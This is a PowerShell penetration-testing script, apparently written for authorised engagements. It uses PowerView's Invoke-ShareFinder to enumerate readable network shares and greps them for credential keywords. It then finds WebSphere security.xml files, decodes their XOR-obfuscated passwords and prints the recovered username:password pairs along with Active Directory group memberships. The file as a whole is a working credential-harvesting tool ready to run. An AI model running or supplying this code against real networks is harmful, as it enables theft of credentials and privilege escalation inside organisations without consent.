<#
.SYNOPSIS

Iterates through files found using the current credentials share permissions.

Author: Gabriel Thompson (@grnbeltwarrior)
Required Dependencies: Powerview.ps1 https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
Optional Dependencies: None

.DESCRIPTION

Using Invoke-ShareFinder from powerview.ps1, gets a list of accessible shares. Outputs to text file for further documentation/manual review.
Iterate through shares looking for matching files. String pattern matching on target text in matching files. Output to files per system/share for manual review.
Looking through the powershellGrep output files for any file ending in security.xml. 
Then getting the content of the file on the server and looking line by line for username and xor credentials.

.PARAMETER file

Scopelist of hostnames or ip addresses in scope.

.EXAMPLE

PS H:\ Invoke-XORSearch C:\Users\grnbeltwarrior\Pentesting\ProjectName\scopelist.txt
#>

function Invoke-XORSearch
{

    [CmdletBinding()]
    param (
        [string]$file = $(throw "-path to scopelist.txt is required.") 
    )

    $global:accountArray = @()

        # Find files ending with security.xml in the output files of the powershellGrep function.
    function getFileContent($file){
        $filePath = pathGrep($file)
        $fileList = Get-ChildItem "$filePath\Powershell_Grep_Results"
        foreach ($file in $fileList){
            foreach ($line in Get-Content $filePath\$file){
                if (($line.StartsWith("\\")) -AND ($line.EndsWith("security.xml"))){
                    xorFind $line
                }
            }
        }
    }
    # This function was taken from the powershell located here: http://www.craigkim.com/2016/05/websphere-xor-decryption.html
    function xorDecode($encoded) {
        if ($encoded.ToLower().StartsWith('{xor}')) {
            $enPswd = $encoded.Substring(5)
        }
        else {
            $enPswd = $encoded
        }
        $dePswd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enPswd))
        $clPswd = ''
        for ($i = 0; $i -lt $dePswd.Length; $i++) {
            $clPswd += [char]([int][char]($dePswd.Substring($i, 1)) -bxor 0x5f)
        }
        return $clPswd
    }

    function formatOutput($username,$decodedPassword,$filePath){
        Write-Host "Creds found: "$filePath
        Write-Host $username":"$decodedPassword
        Try {Get-ADUser $username; (Get-ADUser -Identity $username -Properties MemberOf | Select-Object MemberOf).MemberOf}
        Catch {}
        Write-Host "##############################"
    }

    function addToList($username,$decodedPassword,$filePath){
        [string]$creds = -join($username,":",$decodedPassword,":",$filePath)
        # if string isn't in the array
        if ($global:accountArray -notcontains $creds){
            $global:accountArray += $creds
        }
    }

    function xorFind($filePath){
        foreach ($line in Get-Content $filePath) {
            if (($line -like "*userid*") -AND ($line -like "*password*")) {
                # Rip apart the lines to get username and password then decode the XOR password if identified as such.
                $result = $line.split(" ")
                foreach ($split in $result){
                    if ($split -like "*userid*") {
                        $username = $split.split('=')[1]
                        #Trap for null value needed
                        if ([string]::IsNullOrWhitespace($username) -OR ($username -eq "")){
                            continue
                        }
                        $username = $username.trim('"')
                    }
                    if ($split -like "*password*") {
                        $password = ($split -split '=',2)[1]
                        #Trap for null value needed
                        if ([string]::IsNullOrWhitespace($password) -OR ($password -eq "")){
                            continue
                        }
                        $password = $password.trim('"')
                        $decodedPassword = xorDecode $password
                    addToList $username $decodedPassword $filePath
                    }
                }
            }
            #primaryAdminID and bindPassword for websphere.
            if (($line -like "*primaryadminid*") -AND ($line -like "*bindpassword*")) {
                $result = $line.split(" ")
                foreach ($split in $result){
                    if ($split -like "*primaryadminid*") {
                        $username = $split.split('=')[1]
                        #Trap for null value needed
                        if ([string]::IsNullOrWhitespace($username) -OR ($username -eq "")){
                            continue
                        }
                        $username = $username.trim('"')
                    }
                    if ($split -like "*bindpassword*") {
                        $password = ($split -split '=',2)[1]
                        #Trap for null value needed
                        if ([string]::IsNullOrWhitespace($password) -OR ($password -eq "")){
                            continue
                        }
                        $password = $password.trim('"')
                        $decodedPassword = xorDecode $password
                    addToList $username $decodedPassword $filePath
                    }
                }
            }
        }
    }

    function pathGrep($file){
        $filePath = $file.ToString()
        $filePath = $filePath.split("\")[-2]
        return $filePath
    }

    function splitAccountInfo($global:accountArray){
        $global:accountArray = $global:accountArray | sort
        foreach ($account in $global:accountArray){
            $username = $account.split(':')[0]
            $decodedPassword = $account.split(':')[1]
            $path = $account.split(':')[2]
            formatOutput $username $decodedPassword $path
        }
    }
    Invoke-PowershellGrep $file
    $ProjectName = pathGrep($file)
    $ProjectPath = $file.subString(0, $file.IndexOf("\scopelist.txt"))
    $ShareList = "$ProjectPath\$ProjectName.Shares.txt"
    if ((Get-Item $ShareList).length/1KB -gt 0){
        getFileContent $file
        splitAccountInfo $global:accountArray
    }
    else {
        Write-Host "No shares were found with at least read permissions for your account."
    }
}

<#
.SYNOPSIS

Iterates through files found using the current credentials share permissions.

Author: Gabriel Thompson (@grnbeltwarrior)
Required Dependencies: Powerview.ps1 https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
Optional Dependencies: None

.DESCRIPTION

Using Invoke-ShareFinder from powerview.ps1, gets a list of accessible shares. Outputs to text file for further documentation/manual review.
Iterate through shares looking for matching files. String pattern matching on target text in matching files. Output to files per system/share for manual review.

.PARAMETER file

Scopelist of hostnames or ip addresses in scope.

.EXAMPLE

PS H:\ Invoke-PowershellGrep C:\Users\grnbeltwarrior\Pentesting\ProjectName\scopelist.txt
#>
# This function was created by a colleague that I modified to fit in this script and can also be run separately.
function Invoke-PowershellGrep($file){
    $ProjectName = pathGrep($file)
    $HostList = $file
    $ProjectPath = $file.subString(0, $file.IndexOf("\scopelist.txt"))

    $ShareList = "$ProjectPath\$ProjectName.Shares.txt"
    $ResultsPath = "$ProjectPath\PowerShell_Grep_Results"
    $Today = Get-Date -format yyyyMMdd
    $TargetText= "(username|pass=|password|creditc|userid|appid|loginid|login=|user=|server=|ftp|sftp|ssh|uid|pwd|{xor}|wsadmin)"

    #enumerate shares based on a list of target hosts (name or IP)
    Import-Module 'Z:\PowerSploit\Recon\PowerView.ps1'

    Write-Host "Powerview module imported." -ForegroundColor Yellow
    # If using an older version of powerview, the below Invoke-Sharefinder line can be used. Comment out the foreach lines under the # OR comment.
    # Invoke-Sharefinder -HostList $HostList -CheckShareAccess |  %{ $_.Split(' ')[0]; } | Out-File -Encoding ascii -Append $ShareList

    # OR
    foreach ($system in Get-Content $Hostlist) {
        Invoke-Sharefinder -ComputerName $system -NoPing -CheckShareAccess -ExcludePrint |  %{ $_.Split('-')[0]; } | Out-File -Encoding ascii -Append $ShareList
    }

    Write-Host "Potentially accessible shares enumerated:" -ForegroundColor Yellow
    Get-Content $ShareList # -ForegroundColor Yellow

    #set up results file path/name
    foreach ($Share in Get-Content $ShareList) {
        $CleanName = $Share -replace '\\','_' -replace '__','_'
	    $CleanName = $CleanName.TrimEnd()
        $CleanName = "$ProjectName$CleanName.grepped.$Today.txt"
	    $Share = $Share.TrimEnd()        
	    $Path = "$Share\*"
        $PathArray = @()

        # Check if dest directory exists, and if not, create it
        if (Test-Path -Path $ResultsPath -PathType Container) {
            Write-Host "$ResultsPath already exists, proceeding to needle $Path" -ForegroundColor Yellow
        }
        else {
            Write-Host "Creating $ResultsPath and proceeding to needle $Path" -ForegroundColor Yellow
            New-Item -Path $ResultsPath -ItemType directory | Out-Null
        }

        # get all the files in $Path that contain the TargetText strings
        Get-ChildItem $Path -Recurse -Include "*.txt","*.log","*.cfg","*.conf","*.config","*.ini","*.cmd","*.bat","*.py","*.properties*","*.sql","*.xml","*password*","*debug*","ssh*","*.ps1"  -ErrorAction SilentlyContinue |
            Where-Object { $_.Attributes -ne "Directory"} |
            ForEach-Object {
	    	    If (Get-Content $_.FullName | Select-String -Pattern $TargetText) {
		            $Needles = Get-Content $_.FullName | Select-String -Pattern $TargetText
		            $PathArray += $_.FullName 
		            $PathArray += $Needles
		            $PathArray += " "
		            $PathArray += "#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*# "
                    $PathArray += " "
		        }
            }
	    $PathArray | ForEach-Object {$_} |  Out-File $ResultsPath\$CleanName
        Write-Host "Powershell_Grep completed searching through $Path."  -ForegroundColor Yellow
        Write-Host "Please see $ResultsPath\$CleanName for results." -ForegroundColor Yellow
    }
    Write-Host "Powershell_Grep completed needling $ProjectName."
}
